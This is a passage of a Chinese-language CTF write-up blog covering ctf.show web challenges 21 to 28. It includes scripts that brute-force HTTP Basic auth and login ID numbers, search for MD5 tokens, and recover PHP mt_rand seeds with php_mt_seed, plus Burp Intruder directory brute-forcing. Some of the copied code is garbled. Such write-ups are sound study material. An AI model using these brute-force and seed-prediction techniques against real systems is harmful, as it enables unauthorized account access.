class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2020-11-20 19:16:49</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2020-11-20 20:28:42</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://41a801fe-a420-47bc-8593-65c3f26b7efa.chall.ctf.show/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">password = []</span><br><span class="line"></span><br><span class="line">with <span class="title function_ invoke__">open</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    data = f.<span class="title function_ invoke__">readline</span>() </span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">    password.<span class="title function_ invoke__">append</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p in password:</span><br><span class="line">strs = <span class="string">&#x27;admin:&#x27;</span>+ p[:-<span class="number">1</span>]</span><br><span class="line">header=&#123;</span><br><span class="line"><span class="string">&#x27;Authorization&#x27;</span>:<span class="string">&#x27;Basic &#123;&#125;&#x27;</span>.<span class="title function_ invoke__">format</span>(base64.<span class="title function_ invoke__">b64encode</span>(strs.<span class="title function_ invoke__">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>)).<span class="title function_ invoke__">decode</span>(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">&#125;</span><br><span class="line">rep =requests.<span class="title function_ invoke__">get</span>(url,headers=header)</span><br><span class="line">time.<span class="title function_ invoke__">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line"><span class="keyword">if</span> rep.status_code ==<span class="number">200</span>:</span><br><span class="line"><span class="keyword">print</span>(rep.text)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h1><blockquote><p>域名也可以爆破的，试试爆破这个ctf.show的子域名</p></blockquote><h1 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h1><blockquote><p>还爆破？这么多代码，告辞！</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这题考的是脚本编写，直接使用脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">dic = <span class="string">&#x27;0123456789qwertyuiopasdfghjklzxcvbnm&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a in dic:</span><br><span class="line">    <span class="keyword">for</span> b in dic:</span><br><span class="line">        t = <span class="title function_ invoke__">str</span>(a) + <span class="title function_ invoke__">str</span>(b)</span><br><span class="line">        md5 = hashlib.<span class="title function_ invoke__">md5</span>(t.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">        <span class="comment"># print(md5)</span></span><br><span class="line">        <span class="comment"># print(md5[1:2])</span></span><br><span class="line">        <span class="comment"># print(md5[14:15])</span></span><br><span class="line">        <span class="comment"># print(md5[17:18])</span></span><br><span class="line">        <span class="keyword">if</span> md5[<span class="number">1</span>:<span class="number">2</span>] == md5[<span class="number">14</span>:<span class="number">15</span>] <span class="keyword">and</span> md5[<span class="number">14</span>:<span class="number">15</span>]== md5[<span class="number">17</span>:<span class="number">18</span>]:</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(md5[<span class="number">1</span>:<span class="number">2</span>])) &gt;= <span class="number">48</span> <span class="keyword">and</span> <span class="title function_ invoke__">ord</span>(md5[<span class="number">1</span>:<span class="number">2</span>]) &lt;= <span class="number">57</span> <span class="keyword">and</span> (<span class="title function_ invoke__">ord</span>(md5[<span class="number">14</span>:<span class="number">15</span>])) &gt;= <span class="number">48</span> <span class="keyword">and</span> <span class="title function_ invoke__">ord</span>(md5[<span class="number">14</span>:<span class="number">15</span>]) &lt;= <span class="number">57</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(md5[<span class="number">17</span>:<span class="number">18</span>])) &gt;= <span class="number">48</span> <span class="keyword">and</span> <span class="title function_ invoke__">ord</span>(md5[<span class="number">17</span>:<span class="number">18</span>]) &lt;= <span class="number">57</span> <span class="keyword">and</span> (<span class="title function_ invoke__">ord</span>(md5[<span class="number">31</span>:<span class="number">32</span>])) &gt;= <span class="number">48</span> <span class="keyword">and</span> <span class="title function_ invoke__">ord</span>(</span><br><span class="line">                        md5[<span class="number">31</span>:<span class="number">32</span>]) &lt;= <span class="number">57</span>:</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">int</span>(md5[<span class="number">1</span>:<span class="number">2</span>]) + <span class="keyword">int</span>(md5[<span class="number">14</span>:<span class="number">15</span>]) + <span class="keyword">int</span>(md5[<span class="number">17</span>:<span class="number">18</span>])) / <span class="keyword">int</span>(md5[<span class="number">1</span>:<span class="number">2</span>]) == <span class="keyword">int</span>(md5[<span class="number">31</span>:<span class="number">32</span>]):</span><br><span class="line">                        <span class="keyword">print</span>(t)</span><br></pre></td></tr></table></figure><p>这里面我最开始写的时候没有12-14行，虽然会报错但是也能运行，wp中将其完善了一下。得到运行结果<code>3j</code><br>直接post传入即可得到flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677728759208-d504308e-6a04-47f2-a1ed-32f22148ac7c.png" alt="image.png"></p><h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p>Q：这里为什么分别用ord和int：<br>A：int改变数据类型，外型不变；ord改变数据类型，值不改变：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677729322819-fdd917cf-96e9-440e-9537-4ecd5ca16fe9.png" alt="20180517204019346.png"></p><h1 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h1><blockquote><p>爆个🔨</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:26:39</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 13:53:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h2><p>代码中的<code>mt_srand()</code>为随机数生成器设定种子，可以之后调用随机数生成器，可以保证随机数生成的相同。所以这题很明确了，直接找到生成的随机数即可。<br>用PHPStorm找一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677830788193-57352fa8-4703-4b29-b7b6-6b8e4eeaa326.png" alt="image.png"><br>然后直接get传入即可：<img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677830905489-9c6c4461-458d-4ca6-a1a2-9638ac7bf795.png" alt="image.png"></p><h1 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h1><blockquote></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>hexdec()</code>函数将十六进制转化为十进制。<br><del>猪脑过载了，开始打算写脚本跑出来第一个（第七行）的mt_rand()的值，但似乎直接给r传入0就行……</del><br>直接将r传入0，得到第一个mt_rand的值<code>1277101134</code>（即时生成的）。这时候，我们的目标就转化为尝试找到原种子的值。在搜索之后，发现有一个php_mt_seed的项目可以尝试破解出原种子的值。</p><h2 id="php-mt-seed"><a href="#php-mt-seed" class="headerlink" title="php_mt_seed"></a>php_mt_seed</h2><p>下载：<a href="https://www.openwall.com/php_mt_seed/">https://www.openwall.com/php_mt_seed/</a><br>下载之后直接在kali中解压中即可（可以使用windows，但是需要g++编译，因为之前没安装过）<br>解压之后需要先make一下生成文件（我这里刚刚更新过）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677839965380-57f4b720-0465-4dba-8c73-d7ace551f01b.png" alt="image.png"><br>然后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time ./php_mt_seed <span class="number">1277101134</span></span><br></pre></td></tr></table></figure><p>等待它找到seed。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677840306922-3ff2ae19-0589-40ec-93d8-516e45d2ee81.png" alt="image.png"><br>然后将生成的mt_rand()的结果相加：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="number">3352708826</span>, <span class="number">3352708827</span>, <span class="number">72059293</span>, <span class="number">379534775</span>, <span class="number">2177040484</span>, <span class="number">2437797623</span>, <span class="number">3102727756</span>, <span class="number">3907641824</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$f</span> = <span class="number">0</span>; <span class="variable">$f</span> &lt; <span class="number">11</span>; <span class="variable">$f</span>++)&#123;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$a</span>[<span class="variable">$f</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span> + <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677840379255-b1b12693-291d-4300-a0c8-4005848709f9.png" alt="image.png"><br>然后就是一个一个尝试进去得到flag：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677839267980-50ace50b-01b0-4096-b744-2d70dec7b52a.png" alt="image.png"></p><h1 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h1><p>上来就是连接数据库，但是似乎全为空的时候就连接成功了，应该是bug。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677841398062-c31cda10-af2d-4736-8121-f604790b2cf7.png" alt="image.png"><br>爆破的话可能费点劲了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677841574076-21b6d96c-5e80-4497-bd55-a7e4f7f0384c.png" alt="image.png"></p><h1 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h1><h2 id="方案一-1"><a href="#方案一-1" class="headerlink" title="方案一"></a>方案一</h2><p>这题有点意思，上来就是一个登陆页面：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677841752959-36877d3f-2eca-42a6-b8e8-70ab983382da.png" alt="image.png"><br>下方有一个录取名单获取，下载一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677841938577-d558f1b0-499c-4b86-a062-0528b771ee58.png" alt="image.png"><br>网页中还有一个学籍管理系统，估计就是用这个来查找了，我们可以尝试爆破这个页面：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842002490-837a816c-6a10-4154-8a59-f4f2f9033cd3.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842443902-30f3d0b2-3f79-443d-afa2-ae744d5a6792.png" alt="image.png"><br>修改payload类型<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842468948-8d5e1435-2827-455c-b534-16d03b9b06a2.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842490721-bc38685b-9fc7-4cbf-a36c-a8951f791ee3.png" alt="image.png"><br>然后直接查询。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842525622-e75d02c1-6eb3-4b39-bc82-a824d5041a80.png" alt="image.png"><br>这下就得到了账号：02015237 密码：621022199002015237<br>返回去登陆页面。登录即可<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842624036-ffaab3b1-0968-4738-a3b2-4762e09e66c0.png" alt="image.png"></p><h2 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h2><p>wp提供的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//621022********5237</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;zid.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$year</span>=<span class="number">1990</span>;<span class="variable">$year</span>&lt;<span class="number">1993</span>;<span class="variable">$year</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$mon</span>=<span class="number">1</span>;<span class="variable">$mon</span>&lt;<span class="number">10</span>;<span class="variable">$mon</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$day</span>=<span class="number">01</span>;<span class="variable">$day</span>&lt;<span class="number">10</span>;<span class="variable">$day</span>++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$txt</span>=(<span class="string">&#x27;621022&#x27;</span>.<span class="variable">$year</span>.<span class="string">&#x27;0&#x27;</span>.<span class="variable">$mon</span>.<span class="string">&#x27;0&#x27;</span>.<span class="variable">$day</span>.<span class="string">&#x27;5237&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; f</span><br><span class="line"><span class="keyword">or</span>(<span class="variable">$year</span>=<span class="number">1990</span>;<span class="variable">$year</span>&lt;<span class="number">1993</span>;<span class="variable">$year</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$mon</span>=<span class="number">1</span>;<span class="variable">$mon</span>&lt;<span class="number">10</span>;<span class="variable">$mon</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$day</span>=<span class="number">10</span>;<span class="variable">$day</span>&lt;=<span class="number">31</span>;<span class="variable">$day</span>++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$txt</span>=(<span class="string">&#x27;621022&#x27;</span>.<span class="variable">$year</span>.<span class="string">&quot;0&quot;</span>.<span class="variable">$mon</span>.<span class="variable">$day</span>.<span class="string">&#x27;5237&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; f</span><br><span class="line"><span class="keyword">or</span>(<span class="variable">$year</span>=<span class="number">1990</span>;<span class="variable">$year</span>&lt;<span class="number">1993</span>;<span class="variable">$year</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$mon</span>=<span class="number">10</span>;<span class="variable">$mon</span>&lt;=<span class="number">12</span>;<span class="variable">$mon</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$day</span>=<span class="number">10</span>;<span class="variable">$day</span>&lt;=<span class="number">31</span>;<span class="variable">$day</span>++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$txt</span>=(<span class="string">&#x27;621022&#x27;</span>.<span class="variable">$year</span>.<span class="variable">$mon</span>.<span class="variable">$day</span>.<span class="string">&#x27;5237&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; f</span><br><span class="line"><span class="keyword">or</span>(<span class="variable">$year</span>=<span class="number">1990</span>;<span class="variable">$year</span>&lt;<span class="number">1993</span>;<span class="variable">$year</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$mon</span>=<span class="number">10</span>;<span class="variable">$mon</span>&lt;=<span class="number">12</span>;<span class="variable">$mon</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$day</span>=<span class="number">01</span>;<span class="variable">$day</span>&lt;<span class="number">10</span>;<span class="variable">$day</span>++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$txt</span>=(<span class="string">&#x27;621022&#x27;</span>.<span class="variable">$year</span>.<span class="variable">$mon</span>.<span class="string">&quot;0&quot;</span>.<span class="variable">$day</span>.<span class="string">&#x27;5237&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; f</span><br><span class="line"><span class="title function_ invoke__">close</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><h1 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h1><p>上来页面中什么也没有，但是注意到域名中有蹊跷：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842814104-e64b62a2-3eca-40a7-86fb-7f2805ba5979.png" alt="image.png"><br>提示里面写了只用爆破目录即可，因此修改intruder。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677844522366-e4a15f61-248c-4cb6-a093-587a7d4381a4.png" alt="image.png"></p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>他说的爆破目录修改的payload应该是：<code>/0/1/</code>而不是<code>/0/1</code>，后者会返回重定向301</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
